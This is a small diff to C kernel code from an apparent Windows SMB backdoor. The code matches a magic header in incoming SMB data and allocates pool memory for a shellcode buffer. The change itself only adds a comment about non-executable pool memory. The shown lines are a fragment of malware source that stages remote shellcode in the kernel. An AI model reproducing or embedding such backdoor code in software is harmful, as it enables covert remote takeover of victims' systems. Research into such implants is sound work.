@@ -17,6 +17,7 @@ NTSTATUS SmbDoorNegotiateCallback(PVOID Unknown, SIZE_T RawSize, PUCHAR RawBytes
 
 	if (*(ULONG*)RawBytes == SMBDOOR_SMB_HEADER) // 'ExPu'
 	{
+		// incoming bytes are on NPP-NX pool
 		PVOID ShellcodeBuffer = ExAllocatePoolWithTag(NonPagedPool, RawSize - 4, SMBDOOR_POOL_TAG);
 
 		if (ShellcodeBuffer != NULL)
